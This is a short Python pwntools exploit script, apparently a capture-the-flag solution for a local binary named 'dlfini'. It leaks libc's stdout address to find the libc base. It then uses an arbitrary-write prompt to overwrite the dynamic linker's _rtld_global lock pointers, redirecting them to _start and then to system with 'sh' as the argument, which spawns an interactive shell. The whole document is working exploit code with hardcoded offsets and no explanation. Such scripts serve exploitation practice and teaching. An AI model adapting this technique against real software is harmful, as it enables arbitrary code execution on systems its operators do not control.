from pwn import *

context.log_level = 'debug'

p = process('./bin/dlfini')
e = ELF('./bin/dlfini')
libc = e.libc

stdout = int(p.recvline().split(': ')[1][2:], 16)
libc_base = stdout - libc.symbols['_IO_2_1_stdout_']
system = libc_base + libc.symbols['system']
rtld_global = libc_base + 0x619060
rtld_recursive = rtld_global + 3840
rtld_load_lock = rtld_global + 2312

log.info('stdout: ' + hex(stdout))
log.info('libc_base: ' + hex(libc_base))

def write(addr, data):
  p.sendlineafter('addr: ', repr(addr))
  p.sendlineafter('data: ', repr(data))

log.info('main')
write(rtld_recursive, e.symbols['_start'])
log.info('sh')
write(rtld_load_lock, u16('sh'))
log.info('system')
write(rtld_recursive, system)

p.interactive()

